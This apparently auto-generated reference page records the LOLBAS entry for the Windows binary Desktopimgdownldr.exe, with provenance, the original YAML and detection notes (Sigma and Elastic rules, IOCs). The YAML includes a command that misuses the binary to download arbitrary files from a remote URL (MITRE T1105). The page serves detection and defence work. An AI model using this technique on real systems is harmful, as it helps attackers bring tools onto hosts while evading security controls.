---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Desktopimgdownldr.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `desktopimgdownldr.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Desktopimgdownldr.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Desktopimgdownldr.exe](../../tools/windows/desktopimgdownldr.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | desktopimgdownldr.exe |
| name | Desktopimgdownldr.exe |
| type | tool |
| source | lolbas |
| url | https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/ |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@gal_kristal'
  Person: Gal Kristal
Author: Gal Kristal
Commands:
- Category: Download
  Command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
  Description: Downloads the file and sets it as the computer's lockscreen
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Download arbitrary files from a web server
Created: 2020-06-28
Description: Windows binary used to configure lockscreen/desktop image
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/file/file_event/file_event_win_susp_desktopimgdownldr_file.yml
- Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/command_and_control_remote_file_copy_desktopimgdownldr.toml
- IOC: desktopimgdownldr.exe that creates non-image file
- IOC: Change of HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP\LockScreenImageUrl
Full_Path:
- Path: c:\windows\system32\desktopimgdownldr.exe
Name: Desktopimgdownldr.exe
Resources:
- Link: https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Desktopimgdownldr.yml
```

## Detection / Analysis Notes

```text
Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/command_and_control_remote_file_copy_desktopimgdownldr.toml
```

```text
IOC: Change of HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP\LockScreenImageUrl
```

```text
IOC: desktopimgdownldr.exe that creates non-image file
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/file/file_event/file_event_win_susp_desktopimgdownldr_file.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/file/file_event/file_event_win_susp_desktopimgdownldr_file.yml
- Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/command_and_control_remote_file_copy_desktopimgdownldr.toml
- IOC: desktopimgdownldr.exe that creates non-image file
- IOC: Change of HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP\LockScreenImageUrl
```
